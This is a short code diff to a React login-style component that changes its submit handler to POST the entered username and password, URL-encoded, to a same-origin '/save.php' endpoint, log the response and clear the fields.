@@ -12,12 +12,28 @@ function Online() {
     setPassword(event.target.value);
   };
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-
+  
+    try {
+      const response = await fetch('/save.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+      });
+  
+      const data = await response.text();
+      console.log(data); // Display the response from the server
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  
     setUsername('');
     setPassword('');
   };
+  
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-gray-100">
